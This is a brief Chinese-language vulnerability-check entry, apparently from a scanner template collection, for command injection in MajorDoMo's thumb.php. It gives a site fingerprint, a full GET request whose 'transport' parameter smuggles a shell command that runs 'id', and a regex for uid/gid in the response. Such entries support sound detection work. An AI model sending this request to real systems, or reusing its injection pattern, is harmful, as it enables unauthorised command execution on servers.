# MajorDoMothumb命令执行漏洞

MajorDoMothumb ｜ 命令执行 ｜ —
- **指纹**：`body="MajordomoSL"`
- **请求**：`GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1`
- **响应特征**：200 ^(?=.*?uid)(?=.*?gid).*?$